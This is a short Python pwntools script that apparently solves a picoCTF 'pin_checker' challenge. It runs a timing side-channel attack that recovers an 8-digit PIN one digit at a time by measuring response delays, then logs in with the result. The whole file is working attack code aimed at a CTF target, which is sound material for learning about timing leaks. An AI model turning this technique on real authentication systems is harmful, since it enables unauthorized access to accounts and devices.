#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./pin_checker")

context.binary = exe

def conn():
	if True:
		r = process([exe.path])
	else:
		r = remote("saturn.picoctf.net", 50405)
	return r


def main():
	pin = ''
	for i in range(8):
		longest_response = 0
		longest_response_num = 0
		for j in range(10):
			r = conn()
			r.recvuntil("code:")
			r.sendline(pin + str(j) + "0" * (7 - i))
			start = time.time()
			r.recvuntil("Access")
			end = time.time()
			elapsed_time = end - start
			#print(elapsed_time)
			if (elapsed_time > longest_response):
				longest_response = elapsed_time
				longest_response_num = j
			#print(longest_response, longest_response_num)
			r.close()
		pin += str(longest_response_num)
		print(pin)
	r = conn()
	r.recvuntil("code:")
	r.sendline(pin)
	r.interactive()

if __name__ == "__main__":
	main()
